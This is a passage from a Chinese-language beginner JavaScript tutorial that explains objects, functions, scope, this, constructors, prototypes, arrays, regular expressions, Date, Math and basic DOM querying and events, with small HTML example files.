			//向obj中添加一个age属性
			obj.age = 18;
			
			/*
			 * 读取对象中的属性
			 * 	语法：对象.属性名
			 * 
			 * 如果读取对象中没有的属性，不会报错而是会返回undefined
			 */
			
			//console.log(obj.gender);
			//console.log(obj.hello);
			
			/*
			 * 修改对象的属性值
			 * 	语法：对象.属性名 = 新值
			 */
			obj.name = "tom";
			
			/*
			 * 删除对象的属性
			 * 	语法：delete 对象.属性名
			 */
			delete obj.name;
			console.log(obj.age);
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
			
			var obj = new Object();

			/*
			 * 向对象中添加属性
			 * 属性名：
			 * 	- 对象的属性名不强制要求遵守标识符的规范
			 * 		什么乱七八糟的名字都可以使用
			 * 	- 但是我们使用是还是尽量按照标识符的规范去做
			 * 
			 */
			obj.name = "孙悟空";
			
			//obj.var = "hello";
			
			/*
			 * 如果要使用特殊的属性名，不能采用.的方式来操作
			 * 	需要使用另一种方式：
			 * 		语法：对象["属性名"] = 属性值
			 * 	读取时也需要采用这种方式
			 * 
			 * 使用[]这种形式去操作属性，更加的灵活，
			 * 	在[]中可以直接传递一个变量，这样变量值是多少就会读取那个属性
			 * 
			 */
			obj["123"] = 789;
			obj["nihao"] = "你好";
			var n = "nihao";
			//console.log(obj["123"]);
			
			/*
			 * 属性值
			 * 	JS对象的属性值，可以是任意的数据类型，甚至也可以是一个对象
			 */
			
			obj.test = true;
			obj.test = null;
			obj.test = undefined;
			
			//创建一个对象
			var obj2 = new Object();
			obj2.name = "猪八戒";
			
			//将obj2设置为obj的属性
			obj.test = obj2;
			
			//console.log(obj.test.name);
			
			/*
			 * in 运算符
			 * 	- 通过该运算符可以检查一个对象中是否含有指定的属性
			 * 		如果有则返回true，没有则返回false
			 *  - 语法：
			 * 		"属性名" in 对象
			 */
			//console.log(obj.test2);
			
			//检查obj中是否含有test2属性
			//console.log("test2" in obj);
			//console.log("test" in obj);
			console.log("name" in obj);
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<blockquote> 
 <p><span style="color:#ed7976;">JS中的变量都是保存到栈内存中的</span>，基本数据类型的值直接在栈内存中存储，值与值之间是独立存在，修改一个变量不会影响其他的变量。</p> 
 <p><span style="color:#ed7976;">对象是保存到堆内存中的</span>，每创建一个新的对象，就会在堆内存中开辟出一个新的空间，而变量保存的是对象的内存地址（对象的引用），如果两个变量保存的是同一个对象引用，当一个通过一个变量修改属性时，另一个也会受到影响。</p> 
</blockquote> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
			
			//创建一个对象
			//var obj = new Object();
			
			/*
			 * 使用对象字面量来创建一个对象
			 */
			var obj = {};
			//console.log(typeof obj);
			
			obj.name = "孙悟空";
			//console.log(obj.name);
			
			/*
			 * 使用对象字面量，可以在创建对象时，直接指定对象中的属性
			 * 语法：{属性名:属性值,属性名:属性值....}
			 * 对象字面量的属性名可以加引号也可以不加，建议不加,如果要使用一些特殊的名字，则必须加引号
			 * 
			 * 属性名和属性值是一组一组的名值对结构，名和值之间使用:连接，多个名值对之间使用,隔开；
			 * 	如果一个属性之后没有其他的属性了，就不要写,
			 */
			var obj2 = {
				
				name:"猪八戒",
				age:13,
				gender:"男",
				test:{name:"沙僧"}
				
			};
			
			console.log(obj2.test);
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
			
			/*
			 * 创建一个对象
			 */
			var obj = {
					name:"孙悟空",
					age:18,
					gender:"男",
					sayName:function(){
						alert(this.name);
					}
			};

			/*
			 * 使用工厂方法创建对象
			 * 	通过该方法可以大批量的创建对象
			 */
			function createPerson(name , age ,gender){
				//创建一个新的对象 
				var obj = new Object();
				//向对象中添加属性
				obj.name = name;
				obj.age = age;
				obj.gender = gender;
				obj.sayName = function(){
					alert(this.name);
				};
				//将新的对象返回
				return obj;
			}
			
			/*
			 * 用来创建狗的对象
			 */
			function createDog(name , age){
				var obj = new Object();
				obj.name = name;
				obj.age = age;
				obj.sayHello = function(){
					alert("汪汪~~");
				};
				
				return obj;
			}
			
			var obj2 = createPerson("猪八戒",28,"男");
			var obj3 = createPerson("白骨精",16,"女");
			var obj4 = createPerson("蜘蛛精",18,"女");
			/*
			 * 使用工厂方法创建的对象，使用的构造函数都是Object
			 * 	所以创建的对象都是Object这个类型，
			 * 	就导致我们无法区分出多种不同类型的对象
			 */
			//创建一个狗的对象
			var dog = createDog("旺财",3);
			
			console.log(dog);
			console.log(obj4);
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<h3>3.6 函数（Function）</h3> 
<p>函数也是一个对象，也具有普通对象的功能。函数中可以封装一些代码，在需要的时候可以去调用函数来执行这些代码。使用typeof检查一个函数时会返回function。</p> 
<blockquote> 
 <p><strong>    - 创建函数</strong><br>         - 函数声明<br>             function 函数名([形参1,形参2...形参N]){<!-- --><br>                 语句...<br>             }<br>         <br>         - 函数表达式<br>             var 函数名 = function([形参1,形参2...形参N]){<!-- --><br>                 语句...<br>             };<br>             <br><strong>    - 调用函数</strong><br>         - 语法：函数对象([实参1,实参2...实参N]);<br>             fun() sum() alert() Number() parseInt()<br>         - 当我们调用函数时，函数中封装的代码会按照编写的顺序执行</p> 
 <p>    - 形参和实参<br>         - 形参：形式参数<br>             - 定义函数时，可以在()中定义一个或多个形参，形参之间使用,隔开<br>                 定义形参就相当于在函数内声明了对应的变量但是并不赋值，<br>                 形参会在调用时才赋值。<br>                 <br>         - 实参：实际参数<br>             - 调用函数时，可以在()传递实参，传递的实参会赋值给对应的形参,<br>                 调用函数时JS解析器不会检查实参的类型和个数，可以传递任意数据类型的值。<br>                 如果实参的数量大于形参，多余实参将不会赋值，<br>                 如果实参的数量小于形参，则没有对应实参的形参将会赋值undefined</p> 
 <p>                </p> 
 <p><strong>    - 返回值，就是函数执行的结果。</strong><br>         - 使用return 来设置函数的返回值。<br>         - 语法：return 值;<br>             - 该值就会成为函数的返回值，可以通过一个变量来接收返回值<br>         - return后边的代码都不会执行，一旦执行到return语句时，函数将会立刻退出。<br>         - return后可以跟任意类型的值，可以是基本数据类型，也可以是一个对象。<br>         - 如果return后不跟值，或者是不写return则函数默认返回undefined。<br>         - break、continue和return<br>             - break<br>                 - 退出循环<br>             - continue<br>                 - 跳过当次循环<br>             - return<br>                 - 退出函数<br>                 <br><strong>    - 参数，函数的实参也可以是任意的数据类型。</strong></p> 
 <p><strong>    - 方法（method）</strong><br>         - 可以将一个函数设置为一个对象的属性，<br>             当一个对象的属性是一个函数时，<br>                 我们称这个函数是该对象的方法。<br>         - 对象.方法名();<br>         - 函数名();    </p> 
</blockquote> 
<p><strong><span style="background-color:#f9eda6;">call()、apply()</span></strong></p> 
<p>这两个方法都是函数对象的方法需要通过函数对象来调用，通过两个方法可以直接调用函数，并且可以通过第一个实参来指定函数中this，不同的是call是直接传递函数的实参而apply需要将实参封装到一个数组中传递。</p> 
<p><strong><span style="background-color:#f9eda6;">arguments</span></strong></p> 
<p>arguments和this类似，都是函数中的隐含的参数。arguments是一个类数组元素，它用来封装函数执行过程中的实参，所以即使不定义形参，也可以通过arguments来使用实参。</p> 
<p>arguments中有一个属性callee表示当前执行的函数对象。</p> 
<p><strong><span style="background-color:#f9eda6;">this</span></strong></p> 
<p>this是函数的上下文对象，根据函数的调用方式不同会执向不同的对象。</p> 
<ol><li>以函数的形式调用时，this是window</li><li>以方法的形式调用时，this是调用方法的对象</li><li>以构造函数的形式调用时，this是新建的那个对象</li><li>使用call和apply调用时，this是指定的那个对象</li><li>在全局作用域中this代表window</li></ol> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
			
			/*
			 * 定义一个用来求两个数和的函数
			 * 	可以在函数的()中来指定一个或多个形参（形式参数）
			 * 	多个形参之间使用,隔开，声明形参就相当于在函数内部声明了对应的变量
			 * 	但是并不赋值
			 */
			function sum(a,b){
				console.log("a = "+a);
				console.log("b = "+b);
				console.log(a+b);
			}
			
			/*
			 * 在调用函数时，可以在()中指定实参（实际参数）
			 * 	实参将会赋值给函数中对应的形参
			 */
			/*sum(1,2);
			sum(123,456);*/
			
			/*
			 * 调用函数时解析器不会检查实参的类型,
			 * 	所以要注意，是否有可能会接收到非法的参数，如果有可能则需要对参数进行类型的检查
			 * 函数的实参可以是任意的数据类型
			 */
			//sum(123,"hello");
			//sum(true , false);
			
			/*
			 * 调用函数时，解析器也不会检查实参的数量
			 * 	多余实参不会被赋值
			 * 如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined
			 * 
			 */
			//sum(123,456,"hello",true,null);
			sum(123);
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<h3>3.7 作用域</h3> 
<p>作用域简单来说就是一个变量的作用范围。</p> 
<blockquote> 
 <p>    - 在JS中作用域分成两种：<br><strong>        1.全局作用域</strong><br>             - 直接在script标签中编写的代码都运行在全局作用域中<br>             - 全局作用域在打开页面时创建，在页面关闭时销毁。<br>             - <span style="color:#956fe7;">全局作用域中有一个全局对象window，window对象由浏览器提供，可以在页面中直接使用，它代表的是整个的浏览器的窗口。</span><br>             - 在全局作用域中创建的变量都会作为window对象的属性保存，在全局作用域中创建的函数都会作为window对象的方法保存<br>             - 在全局作用域中创建的变量和函数可以在页面的任意位置访问。在函数作用域中也可以访问到全局作用域的变量。<br>             - 尽量不要在全局中创建变量    <br>         <br><strong>        2.函数作用域</strong><br>             - 函数作用域是函数执行时创建的作用域，每次调用函数都会创建一个新的函数作用域。<br>             - 函数作用域在函数执行时创建，在函数执行结束时销毁。<br>             - 在函数作用域中创建的变量，不能在全局中访问。<br>             - 当在函数作用域中使用一个变量时，它会先在自身作用域中寻找，如果找到了则直接使用，如果没有找到则到上一级作用域中寻找，如果找到了则使用，找不到则继续向上找。<br>                     <br>         - 变量的声明提前<br>             -  会在所有的代码执行之前被声明，但是不会赋值。 所以我们可以在变量声明前使用变量。但是不使用var关键字声明的变量不会被声明提前。<br>             - 在函数作用域中，也具有该特性，使用var关键字声明的变量会在函数所有的代码执行前被声明，如果没有使用var关键字声明变量，则变量会变成全局变量。<br>                 <br>         - 函数的声明提前<br>             - 在全局作用域中，使用函数声明创建的函数（function fun(){}）,会在所有的代码执行之前被创建，也就是我们可以在函数声明前去调用函数，但是使用函数表达式(var fun = function(){})创建的函数没有该特性<br>             - 在函数作用域中，使用函数声明创建的函数，会在所有的函数中的代码执行之前就被创建好了。</p> 
</blockquote> 
<h3>3.8 this（上下文对象）</h3> 
<blockquote> 
 <p>    - 我们每次调用函数时，解析器都会将一个上下文对象作为隐含的参数传递进函数。<br>         使用this来引用上下文对象，根据函数的调用形式不同，this的值也不同。<br>     - this的不同的情况：<br>         1.以函数的形式调用时，this是window<br>         2.以方法的形式调用时，this就是调用方法的对象<br>         3.以构造函数的形式调用时，this就是新创建的对象</p> 
</blockquote> 
<h3>3.9 构造函数</h3> 
<p>构造函数是专门用来创建对象的函数，一个构造函数我们也可以称为一个类。</p> 
<p>通过一个构造函数创建的对象，我们称该对象时这个构造函数的实例，通过同一个构造函数创建的对象，我们称为一类对象。</p> 
<p>构造函数就是一个普通的函数，只是他的调用方式不同，如果直接调用，它就是一个普通函数； 如果使用new来调用，则它就是一个构造函数。</p> 
<p><strong>1）例子：</strong></p> 
<pre><code>        function Person(){
        
        }</code></pre> 
<p><strong>2）构造函数的执行流程：</strong></p> 
<ol><li>创建一个新的对象</li><li>将新的对象作为函数的上下文对象（this）</li><li>执行函数中的代码</li><li>将新建的对象返回</li></ol> 
<p><strong>3）instanceof 用来检查一个对象是否是一个类的实例。</strong>如果该对象时构造函数的实例，则返回true，否则返回false；Object是所有对象的祖先，所以任何对象和Object做instanceof都会返回true。</p> 
<p>语法：对象 instanceof 构造函数</p> 
<p><strong>4）枚举对象中的属性：</strong>for...in</p> 
<p> 语法：</p> 
<pre><code class="language-javascript">            for(var 属性名 in 对象){
            
            }</code></pre> 
<p> for...in 语句的循环体会执行多次，对象中有几个属性就会执行几次，每次讲一个属性名赋值给我们定义的变量，我们可以通过它来获取对象中的属性。</p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
		&lt;script type="text/javascript"&gt;
		
			/*
			 * 创建一个构造函数，专门用来创建Person对象的
			 * 	构造函数就是一个普通的函数，创建方式和普通函数没有区别,
			 * 	不同的是构造函数习惯上首字母大写
			 * 
			 * 构造函数和普通函数的区别就是调用方式的不同
			 * 	普通函数是直接调用，而构造函数需要使用new关键字来调用
			 * 
			 * 构造函数的执行流程：
			 * 	1.立刻创建一个新的对象
			 * 	2.将新建的对象设置为函数中this,在构造函数中可以使用this来引用新建的对象
			 * 	3.逐行执行函数中的代码
			 * 	4.将新建的对象作为返回值返回
			 * 
			 * 使用同一个构造函数创建的对象，我们称为一类对象，也将一个构造函数称为一个类。
			 * 	我们将通过一个构造函数创建的对象，称为是该类的实例
			 * 
			 * this的情况：
			 * 	1.当以函数的形式调用时，this是window
			 * 	2.当以方法的形式调用时，谁调用方法this就是谁
			 * 	3.当以构造函数的形式调用时，this就是新创建的那个对象
			 * 
			 */
			function Person(name , age , gender){
				this.name = name;
				this.age = age;
				this.gender = gender;
				this.sayName = function(){
					alert(this.name);
				};
			}
			
			function Dog(){
				
			}
			
			var per = new Person("孙悟空",18,"男");
			var per2 = new Person("玉兔精",16,"女");
			var per3 = new Person("奔波霸",38,"男");
			
			var dog = new Dog();
			
			/*console.log(per);
			console.log(dog);*/
			
			/*
			 * 使用instanceof可以检查一个对象是否是一个类的实例
			 * 	语法：
			 * 		对象 instanceof 构造函数
			 * 如果是，则返回true，否则返回false
			 */
			//console.log(per instanceof Person);
			//console.log(dog instanceof Person);
			
			/*
			 * 所有的对象都是Object的后代，
			 * 	所以任何对象和Object左instanceof检查时都会返回true
			 */
			//console.log(dog instanceof Object);
			
		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body&gt;
	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<h3>3.10 原型（prototype）</h3> 
<p>创建一个函数以后，解析器都会默认在函数中添加一个数prototype，prototype属性指向的是一个对象，这个对象我们称为原型对象。当函数作为构造函数使用，它所创建的对象中都会有一个隐含的属性执行该原型对象。这个隐含的属性可以通过对象.__proto__来访问。</p> 
<p>原型对象就相当于一个公共的区域，凡是通过同一个构造函数创建的对象他们通常都可以访问到相同的原型对象。我们可以将对象中共有的属性和方法统一添加到原型对象中，这样我们只需要添加一次，就可以使所有的对象都可以使用。</p> 
<p>当我们去访问对象的一个属性或调用对象的一个方法时，它会先自身中寻找，如果在自身中找到了，则直接使用。如果没有找到，则去原型对象中寻找，如果找到了则使用，如果没有找到，则去原型的原型中寻找，依此类推。直到找到Object的原型为止，Object的原型的原型为null，如果依然没有找到则返回undefined。</p> 
<p><strong>hasOwnProperty()</strong>：这个方法可以用来检查对象自身中是否含有某个属性。</p> 
<p>语法：</p> 
<pre><code class="language-javascript">对象.hasOwnProperty("属性名")</code></pre> 
<h3>3.11 数组（Array）</h3> 
<p>数组也是一个对象，是一个用来存储数据的对象，和Object类似，但是它的存储效率比普通对象要高。数组中保存的内容我们称为元素，数组使用索引（index）来操作元素，索引指由0开始的整数。</p> 
<h4>1）数组的操作</h4> 
<p><strong>① 创建数组</strong></p> 
<pre><code class="language-javascript">var arr = new Array();
var arr = [];</code></pre> 
<p><strong>② 向数组中添加元素</strong></p> 
<pre><code class="language-javascript">// 数组对象[索引] = 值;
arr[0] = 123;
arr[1] = "hello";</code></pre> 
<p><strong>③  创建数组时直接添加元素</strong></p> 
<pre><code class="language-javascript">// var arr = [元素1,元素2....元素N];
var arr = [123,"hello",true,null];</code></pre> 
<p><strong>④ 获取和修改数组的长度</strong></p> 
<p>使用length属性来操作数组的长度。</p> 
<p>a）获取长度：</p> 
<pre><code class="language-javascript">数组.length</code></pre> 
<p>length获取到的是数组的最大索引+1。对于连续的数组，length获取到的就是数组中元素的个数。</p> 
<p>b）修改数组的长度</p> 
<pre><code class="language-javascript">数组.length = 新长度</code></pre> 
<p>如果修改后的length大于原长度，则多出的部分会空出来；如果修改后的length小于原长度，则原数组中多出的元素会被删除。</p> 
<p>c）向数组的最后添加元素</p> 
<pre><code class="language-javascript">数组[数组.length] = 值;</code></pre> 
<h4>2）数组的方法</h4> 
<p><strong><span style="background-color:#f9eda6;">① push()</span></strong></p> 
<p>用来向数组的末尾添加一个或多个元素，并返回数组新的长度</p> 
<p>语法：数组.push(元素1,元素2,元素N)</p> 
<p><strong><span style="background-color:#f9eda6;">② pop()</span></strong></p> 
<p>用来删除数组的最后一个元素，并返回被删除的元素</p> 
<p><strong><span style="background-color:#f9eda6;">③ unshift()</span></strong></p> 
<p>向数组的前边添加一个或多个元素，并返回数组的新的长度</p> 
<p><strong><span style="background-color:#f9eda6;">④ shift()</span></strong></p> 
<p>删除数组的前边的一个元素，并返回被删除的元素</p> 
<p><strong><span style="background-color:#f9eda6;">⑤ slice()</span></strong></p> 
<p>可以从一个数组中截取指定的元素，该方法不会影响原数组，而是将截取到的内容封装为一个新的数组并返回。</p> 
<p>参数：</p> 
<ul><li>截取开始位置的索引（包括开始位置）</li><li>截取结束位置的索引（不包括结束位置）</li></ul> 
<blockquote> 
 <p>第二个参数可以省略不写，如果不写则一直截取到最后。参数可以传递一个负值，如果是负值，则从后往前数。</p> 
</blockquote> 
<p><strong><span style="background-color:#f9eda6;">⑥ splice()</span></strong></p> 
<p>可以用来删除数组中指定元素，并使用新的元素替换。该方法会将删除的元素封装到新数组中返回。</p> 
<p>参数：</p> 
<ul><li>删除开始位置的索引</li><li>删除的个数</li><li>三个以后，都是替换的元素，这些元素将会插入到开始位置索引的前边</li></ul> 
<p><strong><span style="background-color:#f9eda6;">⑦ reverse()</span></strong></p> 
<p>可以用来反转一个数组，它会对原数组产生影响</p> 
<p><strong><span style="background-color:#f9eda6;">⑧ concat()</span></strong></p> 
<p>可以连接两个或多个数组，它不会影响原数组，而是新数组作为返回值返回</p> 
<p><strong><span style="background-color:#f9eda6;">⑨ join()</span></strong></p> 
<p>可以将一个数组转换为一个字符串</p> 
<p>参数： 需要一个字符串作为参数，这个字符串将会作为连接符来连接数组中的元素，如果不指定连接符则默认使用。</p> 
<p><strong><span style="background-color:#f9eda6;">⑩ sort()</span></strong></p> 
<p>可以对一个数组中的内容进行排序，默认是按照Unicode编码进行排序，调用以后，会直接修改原数组。</p> 
<p>可以自己指定排序的规则，需要一个回调函数作为参数：</p> 
<pre><code class="language-javascript">function(a,b){
                
    //升序排列
    //return a-b;
                
    //降序排列
    return b-a;
}</code></pre> 
<h4>3）遍历数组</h4> 
<p>遍历数组就是将数组中元素都获取到。</p> 
<p>① 一般情况我们都是使用<strong> for 循环</strong>来遍历数组：</p> 
<pre><code class="language-javascript">for(var i=0 ; i&lt;数组.length ; i++){
    //数组[i]
}</code></pre> 
<p>② 使用 <strong>forEach()</strong> 方法来遍历数组（不兼容IE8）</p> 
<pre><code class="language-javascript">数组.forEach(function(value , index , obj){

});</code></pre> 
<ul><li>forEach()方法需要一个回调函数作为参数，数组中有几个元素，回调函数就会被调用几次，每次调用时，都会将遍历到的信息以实参的形式传递进来，我们可以定义形参来获取这些信息。</li><li>value:正在遍历的元素</li><li>index:正在遍历元素的索引</li><li> obj:被遍历对象</li></ul> 
<h3>3.12 正则表达式</h3> 
<p>正则用来定义一些字符串的规则，程序可以根据这些规则来判断一个字符串是否符合规则，也可以将一个字符串中符合规则的内容提取出来。</p> 
<blockquote> 
 <p><strong>    - 创建正则表达式</strong><br>         - var reg = new RegExp("正则","匹配模式");<br>         - var reg = /正则表达式/匹配模式<br>         <br><strong>    - 语法：</strong><br>         匹配模式：<br>             i:忽略大小写<br>             g:全局匹配模式<br>             - 设置匹配模式时，可以都不设置，也可以设置1个，也可以全设置，设置时没有顺序要求<br>             <br>         正则语法        <br>             | 或<br>             [] 或<br>             [^ ] 除了<br>             [a-z] 小写字母<br>             [A-Z] 大写字母<br>             [A-z] 任意字母<br>             [0-9] 任意数字<br>             <br><strong>    - 方法：</strong><br>         test()<br>             - 可以用来检查一个字符串是否符合正则表达式<br>             - 如果符合返回true，否则返回false</p> 
 <p>    </p> 
 <p>--------------------------------</p> 
 <p>    </p> 
 <p><strong>    - 语法：</strong><br>         - 量词<br>             {n} 正好n次<br>             {m,n} m-n次<br>             {m,} 至少m次<br>             +    至少1次 {1,}<br>             ?   0次或1次 {0,1}<br>             *   0次或多次 {0,}<br>             <br>         - 转义字符<br>             \ 在正则表达式中使用\作为转义字符<br>             \. 表示.<br>             \\ 表示\<br>             . 表示任意字符<br>             \w<br>                 - 相当于[A-z0-9_]<br>             \W<br>                 - 相当于[^A-z0-9_]<br>             \d<br>                 - 任意数字<br>             \D<br>                 - 除了数字<br>             \s<br>                 - 空格<br>             \S<br>                 - 除了空格<br>             \b<br>                 - 单词边界<br>             \B<br>                 - 除了单词边界<br>         ^ 表示开始<br>         $ 表示结束</p> 
</blockquote> 
<p></p> 
<h3>3.13 Date</h3> 
<p>日期的对象，在JS中通过Date对象来表示一个时间</p> 
<blockquote> 
 <p><strong>    - 创建对象</strong><br>         - 创建一个当前的时间对象<br>             var d = new Date();<br>         - 创建一个指定的时间对象<br>             var d = new Date("月/日/年 时:分:秒");<br>             <br><strong>    - 方法：</strong><br>         <span style="background-color:#f9eda6;">getDate()</span><br>             - 当前日期对象是几日（1-31）<br>             <br>         <span style="background-color:#f9eda6;">getDay() </span><br>             - 返回当前日期对象时周几（0-6）<br>                 - 0 周日<br>                 - 1 周一 。。。<br>                 <br>         <span style="background-color:#f9eda6;">getMonth()</span><br>             - 返回当前日期对象的月份（0-11）<br>             - 0 一月 1 二月 。。。<br>         <span style="background-color:#f9eda6;">getFullYear()</span> 从 Date 对象以四位数字返回年份。 <br>         <br>         <span style="background-color:#f9eda6;">getHours() </span>返回 Date 对象的小时 (0 ~ 23)。 <br>        <span style="background-color:#f9eda6;"> getMinutes()</span> 返回 Date 对象的分钟 (0 ~ 59)。 <br>        <span style="background-color:#f9eda6;"> getSeconds()</span> 返回 Date 对象的秒数 (0 ~ 59)。 <br>         <span style="background-color:#f9eda6;">getMilliseconds()</span> 返回 Date 对象的毫秒(0 ~ 999)。 <br>         <br>         <span style="background-color:#f9eda6;">getTime()</span><br>             - 返回当前日期对象的时间戳<br>             - 时间戳，指的是从1970年月1日 0时0分0秒，到现在时间的毫秒数<br>                 计算机底层保存时间都是以时间戳的形式保存的。<br>                 <br>         <span style="background-color:#f9eda6;">Date.now()</span><br>             - 可以获取当前代码执行时的时间戳</p> 
</blockquote> 
<h3>3.14 Math</h3> 
<blockquote> 
 <p>    - Math属于一个工具类，它不需要我们创建对象，它里边封装了属性运算相关的常量和方法。我们可以直接使用它来进行数学运算相关的操作。</p> 
 <p>                 <br>     - 方法：<br>         <strong>Math.PI</strong><br>             - 常量，圆周率<br>        <strong> Math.abs()</strong><br>             - 绝对值运算<br>         <strong>Math.ceil()</strong><br>             - 向上取整<br>        <strong> Math.floor()</strong><br>             - 向下取整<br>        <strong> Math.round()</strong><br>             - 四舍五入取整<br>        <strong> Math.random()  </strong>  <br>             - 生成一个0-1之间的随机数<br>             - 生成一个x-y之间的随机数<br>                 Math.round(Math.random()*(y-x)+x);<br>         <strong>Math.pow(x,y)</strong><br>             - 求x的y次幂<br>        <strong> Math.sqrt()</strong><br>             - 对一个数进行开方<br>         <strong>Math.max()</strong><br>             - 求多个数中最大值<br>       <strong>  Math.min()</strong><br>             - 求多个数中的最小值</p> 
</blockquote> 
<h3>3.15 DOM</h3> 
<blockquote> 
 <p>    - Document Object Model，文档对象模型，通过DOM可以来任意来修改网页中各个内容。<br><strong>    - 文档</strong><br>         - 文档指的是网页，一个网页就是一个文档<br><strong>    - 对象</strong><br>         - 对象指将网页中的每一个节点都转换为对象，转换完对象以后，就可以以一种纯面向对象的形式来操作网页了。<br><strong>    - 模型</strong><br>         - 模型用来表示节点和节点之间的关系，方便操作页面。<br><strong>    - 节点（Node）</strong><br>         - 节点是构成网页的最基本的单元，网页中的每一个部分都可以称为是一个节点，虽然都是节点，但是节点的类型却是不同的。<br>         - 常用的节点<br>             - 文档节点 （Document），代表整个网页<br>             - 元素节点（Element），代表网页中的标签<br>             - 属性节点（Attribute），代表标签中的属性<br>             - 文本节点（Text），代表网页中的文本内容</p> 
</blockquote> 
<h4>1）<strong>DOM操作</strong></h4> 
<blockquote> 
 <p><strong>        - DOM查询</strong><br>         - 在网页中浏览器已经为我们提供了document对象，它代表的是整个网页，它是window对象的属性，可以在页面中直接使用。<br>       <strong>  - document查询方法：</strong><br>             - 根据元素的id属性查询一个元素节点对象：<span style="color:#ed7976;">document.getElementById("id属性值");</span><br>             - 根据元素的name属性值查询一组元素节点对象:document.getElementsByName("name属性值");<br>             - 根据标签名来查询一组元素节点对象：document.getElementsByTagName("标签名");<br>                 <br><strong>        - 元素的属性：</strong><br>             - 读取元素的属性：<br>                 语法：元素.属性名<br>                 例子：ele.name  <br>                       ele.id  <br>                       ele.value <br>                       ele.className<br>                       <br>             - 修改元素的属性：<br>                 语法：元素.属性名 = 属性值<br>                 <br>             - innerHTML<br>                 - 使用该属性可以获取或设置元素内部的HTML代码</p> 
</blockquote> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset="UTF-8"&gt;
		&lt;title&gt;&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
		&lt;button id="btn"&gt;我是一个按钮&lt;/button&gt;
		&lt;script type="text/javascript"&gt;
			
			/*
			 * 浏览器已经为我们提供 文档节点 对象这个对象是window属性
			 * 	可以在页面中直接使用，文档节点代表的是整个网页
			 */
			//console.log(document);
			
			//获取到button对象
			var btn = document.getElementById("btn");
			
			//修改按钮的文字
			btn.innerHTML = "I'm Button";
			
			
		&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;</code></pre> 
<h4>2）事件<strong>（Event）</strong></h4> 
<p>事件指的是用户和浏览器之间的交互行为。比如：点击按钮、关闭窗口、鼠标移动。。。我们可以为事件来绑定回调函数来响应事件。</p> 
<p>绑定事件的方式：</p> 
<p>① 可以在标签的事件属性中设置相应的JS代码</p> 
<pre><code class="language-javascript"> &lt;button onclick="js代码。。。"&gt;按钮&lt;/button&gt;</code></pre> 
<p>② 可以通过为对象的指定事件属性设置回调函数的形式来处理事件</p> 
<pre><code class="language-javascript">&lt;button id="btn"&gt;按钮&lt;/button&gt;
&lt;script&gt;
	var btn = document.getElementById("btn");
	//绑定一个单击事件
	//像这种为单击事件绑定的函数，我们称为单击响应函数
	btn.onclick = function(){
		alert("你还点~~~");
	};
&lt;/script&gt;</code></pre> 
<h4>3）<strong>文档的加载</strong></h4> 
<blockquote> 
 <p></p> 
 <p>浏览器在加载一个页面时，是按照自上向下的顺序加载的，加载一行执行一行。如果将js代码编写到页面的上边，当代码执行时，页面中的DOM对象还没有加载，此时将会无法正常获取到DOM对象，导致DOM操作失败。<br>        <strong> - 解决方式一：</strong><br>             - 可以将js代码编写到body的下边</p> 
 <pre><code class="language-javascript">            &lt;body&gt;
                &lt;button id="btn"&gt;按钮&lt;/button&gt;
                &lt;script&gt;
                    var btn = document.getElementById("btn");
                    btn.onclick = function(){
                    
                    };
                &lt;/script&gt;
            &lt;/body&gt;</code></pre> 
 <p>   <strong>     - 解决方式二：</strong><br>             - 将js代码编写到window.onload = function(){}中<br>             - window.onload 对应的回调函数会在整个页面加载完毕以后才执行，所以可以确保代码执行时，DOM对象已经加载完毕了</p> 
 <pre><code class="language-javascript">            &lt;script&gt;
                window.onload = function(){
                    var btn = document.getElementById("btn");
                    btn.onclick = function(){
                    
                    };
                };
            
            &lt;/script&gt;    </code></pre> 
</blockquote> 
<p></p> 
<h3>3.16 DOM 查询</h3> 
<blockquote> 
 <p><strong>    - 通过具体的元素节点来查询</strong><br>         - 元素.getElementsByTagName()<br>             - 通过标签名查询当前元素的指定后代元素<br>             <br>         - 元素.childNodes<br>             - 获取当前元素的所有子节点<br>             - 会获取到空白的文本子节点<br>         <br>         - 元素.children<br>             - 获取当前元素的所有子元素<br>         <br>         - 元素.firstChild<br>             - 获取当前元素的第一个子节点<br>         <br>         - 元素.lastChild<br>             - 获取当前元素的最后一个子节点<br>         <br>         - 元素.parentNode<br>             - 获取当前元素的父元素<br>         <br>         - 元素.previousSibling<br>             - 获取当前元素的前一个兄弟节点<br>         <br>         - 元素.nextSibling<br>             - 获取当前元素的后一个兄弟节点<br><strong>            <br>     innerHTML和innerText</strong><br>         - 这两个属性并没有在DOM标准定义，但是大部分浏览器都支持这两个属性<br>         - 